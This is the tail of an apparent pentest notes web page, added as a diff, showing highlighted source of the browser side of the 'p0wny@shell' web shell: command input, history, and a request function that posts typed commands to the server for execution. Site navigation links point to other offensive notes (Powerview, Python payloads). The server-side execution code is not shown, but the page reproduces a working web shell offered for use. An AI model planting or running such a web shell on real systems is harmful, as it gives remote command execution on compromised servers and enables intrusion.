+</span></span><span class="line"><span class="cl">            <span class="k">function</span> <span class="nf">_onShellCmdKeyDown</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">switch</span> <span class="p">(</span><span class="nx">event</span><span class="o">.</span><span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s2">&#34;Enter&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">featureShell</span><span class="p">(</span><span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">insertToHistory</span><span class="p">(</span><span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s2">&#34;ArrowUp&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="nx">historyPosition</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">historyPosition</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">blur</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">commandHistory</span><span class="p">[</span><span class="nx">historyPosition</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">_defer</span><span class="p">(</span><span class="k">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                                <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">focus</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                            <span class="p">});</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s2">&#34;ArrowDown&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="nx">historyPosition</span> <span class="o">&gt;=</span> <span class="nx">commandHistory</span><span class="o">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">historyPosition</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="nx">historyPosition</span> <span class="o">===</span> <span class="nx">commandHistory</span><span class="o">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">blur</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">focus</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">commandHistory</span><span class="p">[</span><span class="nx">historyPosition</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">case</span> <span class="s1">&#39;Tab&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">event</span><span class="o">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">featureHint</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">function</span> <span class="nf">insertToHistory</span><span class="p">(</span><span class="nx">cmd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">commandHistory</span><span class="o">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">historyPosition</span> <span class="o">=</span> <span class="nx">commandHistory</span><span class="o">.</span><span class="nx">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">function</span> <span class="nf">makeRequest</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">params</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">function</span> <span class="nf">getQueryString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="p">(</span><span class="k">var</span> <span class="nx">key</span> <span class="nx">in</span> <span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="nx">params</span><span class="o">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="nx">key</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">a</span><span class="o">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">encodeURIComponent</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;=&#34;</span> <span class="o">+</span> <span class="nx">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">[</span><span class="nx">key</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="nx">a</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;&amp;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">xhr</span><span class="o">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">xhr</span><span class="o">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">xhr</span><span class="o">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="k">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="o">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">xhr</span><span class="o">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="k">var</span> <span class="nx">responseJson</span> <span class="o">=</span> <span class="nx">JSON</span><span class="o">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">xhr</span><span class="o">.</span><span class="nx">responseText</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">callback</span><span class="p">(</span><span class="nx">responseJson</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                            <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Error while parsing response: &#34;</span> <span class="o">+</span> <span class="nx">error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">};</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">xhr</span><span class="o">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">getQueryString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nx">document</span><span class="o">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">event</span> <span class="o">=</span> <span class="nx">event</span> <span class="o">||</span> <span class="nx">window</span><span class="o">.</span><span class="nx">event</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">var</span> <span class="nx">selection</span> <span class="o">=</span> <span class="nx">window</span><span class="o">.</span><span class="nx">getSelection</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="nx">event</span><span class="o">.</span><span class="nx">target</span> <span class="o">||</span> <span class="nx">event</span><span class="o">.</span><span class="nx">srcElement</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">target</span><span class="o">.</span><span class="nx">tagName</span> <span class="o">===</span> <span class="s2">&#34;SELECT&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">selection</span><span class="o">.</span><span class="nx">toString</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">focus</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nx">window</span><span class="o">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="k">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">eShellCmdInput</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;shell-cmd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">eShellContent</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;shell-content&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">updateCwd</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">eShellCmdInput</span><span class="o">.</span><span class="nx">focus</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">};</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;shell&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="nx">pre</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;shell-content&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;shell-logo&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">___</span>                         <span class="nx">____</span>      <span class="nx">_</span>          <span class="nx">_</span> <span class="nx">_</span>        <span class="nx">_</span>  <span class="nx">_</span>   <span class="o">&lt;</span><span class="nx">span</span><span class="o">&gt;&lt;/</span><span class="nx">span</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"> <span class="nx">_</span> <span class="nx">__</span>  <span class="o">/</span> <span class="nx">_</span> <span class="nx">\__</span>      <span class="nx">___</span> <span class="nx">__</span>  <span class="nx">_</span>   <span class="nx">_</span>  <span class="o">/</span> <span class="nx">__</span> <span class="nx">\</span> <span class="nx">___</span><span class="o">|</span> <span class="o">|</span><span class="nx">__</span>   <span class="nx">___</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="nx">_</span> <span class="o">/</span><span class="nx">\</span><span class="o">/||</span> <span class="o">||</span> <span class="o">|</span><span class="nx">_</span> <span class="o">&lt;</span><span class="nx">span</span><span class="o">&gt;&lt;/</span><span class="nx">span</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="s1">&#39;_ \| | | \ \ /\ / / &#39;</span><span class="nx">_</span> <span class="nx">\</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span> <span class="o">/</span> <span class="nx">_</span><span class="err">`</span> <span class="o">/</span> <span class="nx">__</span><span class="o">|</span> <span class="err">&#39;</span><span class="nx">_</span> <span class="nx">\</span> <span class="o">/</span> <span class="nx">_</span> <span class="nx">\</span> <span class="o">|</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span><span class="o">/</span><span class="nx">\</span><span class="o">/</span><span class="nx">_</span>  <span class="o">..</span>  <span class="nx">_</span><span class="o">|&lt;</span><span class="nx">span</span><span class="o">&gt;&lt;/</span><span class="nx">span</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="o">|</span><span class="nx">_</span><span class="p">)</span> <span class="o">|</span> <span class="o">|</span><span class="nx">_</span><span class="o">|</span> <span class="o">|</span><span class="nx">\</span> <span class="nx">V</span>  <span class="nx">V</span> <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="nx">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="nx">_</span><span class="o">|</span> <span class="nx">\__</span> <span class="nx">\</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="nx">__</span><span class="o">/</span> <span class="o">|</span> <span class="o">|</span><span class="nx">_</span>   <span class="o">|</span><span class="nx">_</span>      <span class="nx">_</span><span class="o">|&lt;</span><span class="nx">span</span><span class="o">&gt;&lt;/</span><span class="nx">span</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="o">.</span><span class="nx">__</span><span class="o">/</span> <span class="nx">\___</span><span class="o">/</span>  <span class="nx">\_</span><span class="o">/</span><span class="nx">\_</span><span class="o">/</span> <span class="o">|</span><span class="nx">_</span><span class="o">|</span> <span class="o">|</span><span class="nx">_</span><span class="o">|</span><span class="nx">\__</span><span class="p">,</span> <span class="o">|</span><span class="nx">\</span> <span class="nx">\__</span><span class="p">,</span><span class="nx">_</span><span class="o">|</span><span class="nx">___</span><span class="o">/</span><span class="nx">_</span><span class="o">|</span> <span class="o">|</span><span class="nx">_</span><span class="o">|</span><span class="nx">\___</span><span class="o">|</span><span class="nx">_</span><span class="o">|</span><span class="nx">_</span><span class="p">(</span><span class="nx">_</span><span class="p">)</span>    <span class="o">|</span><span class="nx">_</span><span class="o">||</span><span class="nx">_</span><span class="o">|</span>  <span class="o">&lt;</span><span class="nx">span</span><span class="o">&gt;&lt;/</span><span class="nx">span</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span><span class="o">|</span>                         <span class="o">|</span><span class="nx">___</span><span class="o">/</span>  <span class="nx">\____</span><span class="o">/</span>                                  <span class="o">&lt;</span><span class="nx">span</span><span class="o">&gt;&lt;/</span><span class="nx">span</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;shell-input&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="s2">&#34;shell-cmd&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;shell-prompt&#34;</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;shell-prompt&#34;</span><span class="o">&gt;???&lt;/</span><span class="nx">label</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;shell-cmd&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;cmd&#34;</span> <span class="nx">onkeydown</span><span class="o">=</span><span class="s2">&#34;_onShellCmdKeyDown(event)&#34;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">html</span><span class="o">&gt;</span></span></span></code></pre></div>
+  </figure>
+</div>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="page-nav d-flex flex-column flex-sm-row">
+	
+	<div class="card w-100">
+			<div class="card-body d-flex">
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M5 12l6 6"></path>
+						<path d="M5 12l6 -6"></path>
+				 	</svg>
+				</div>
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Prev</div>
+					<a href="/notes/ad/tools/powerview/" class="stretched-link text-reset text-decoration-none">Powerview</a>
+				</div>
+			</div>
+		</div>
+	<div class="m-2"></div>
+	<div class="card text-end w-100">
+			<div class="card-body d-flex justify-content-end">
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Next</div>
+					<a href="/notes/shell-and-payload/python/" class="stretched-link text-reset text-decoration-none">Python</a>
+				</div>
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M13 18l6 -6"></path>
+						<path d="M13 6l6 6"></path>
+					</svg>
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</main>
+		
+	</div>
+
+      
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-lg">
+    <div class="row">
+      <div class="col-lg-8 text-center text-lg-start">
+        <ul class="list-inline">
+          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 text-center text-lg-end">
+        <ul class="list-inline">
+          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://thulite.io/">Thulite</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    
+
+<script async
+  src="/js/app.249127ac97fccea7237e5990340629c63da5a555a7c4a120cf11a5113ea5e96e.js"
+  integrity="sha256-JJEnrJf8zqcjflmQNAYpxj2lpVWnxKEgzxGlET6l6W4=">
+</script>
+
+
+
+
+
+<script async
+  src="/js/flexsearch.be33aab3067e96554f261851c25a593228b91154cd28ff5c7f8d52b2e7f306d2.js"
+  integrity="sha256-vjOqswZ&#43;llVPJhhRwlpZMii5EVTNKP9cf41SsufzBtI=">
+</script>
+<script async
+  src="/js/search-modal.97d606e77f08deeb37876860d99c8f6813ef29263e73b6435c252de6be98d55e.js"
+  integrity="sha256-l9YG538I3us3h2hg2ZyPaBPvKSY&#43;c7ZDXCUt5r6Y1V4=">
+</script>
+
+    
+  </body>
+</html>
